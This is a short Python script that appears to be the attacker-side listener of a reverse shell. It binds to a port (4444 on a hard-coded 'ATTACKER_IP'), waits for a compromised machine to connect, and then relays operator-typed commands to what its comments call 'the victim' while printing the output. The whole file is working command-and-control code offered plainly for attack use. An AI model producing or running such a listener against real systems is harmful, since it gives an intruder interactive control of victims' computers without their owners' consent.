import socket

def start_listener(ip, port):
    try:
        # Create a socket
        listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Bind the socket to the specified IP and port
        listener_socket.bind((ip, port))
        print(f"[+] Listening on {ip}:{port}...")
        
        # Start listening for incoming connections
        listener_socket.listen(5)
        client_socket, client_address = listener_socket.accept()
        print(f"[+] Connection established with {client_address}")
        
        while True:
            # Get command input from the attacker
            command = input("Shell> ")
            
            # Send the command to the victim
            if command.strip().lower() == "exit":
                print("[+] Closing connection...")
                client_socket.close()
                break
            client_socket.send(command.encode())
            
            result = client_socket.recv(4096).decode()
            print(result)
    
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        listener_socket.close()

if __name__ == "__main__":
    ATTACKER_IP = "172.19.19.167"
    ATTACKER_PORT = 4444
    start_listener(ATTACKER_IP, ATTACKER_PORT)
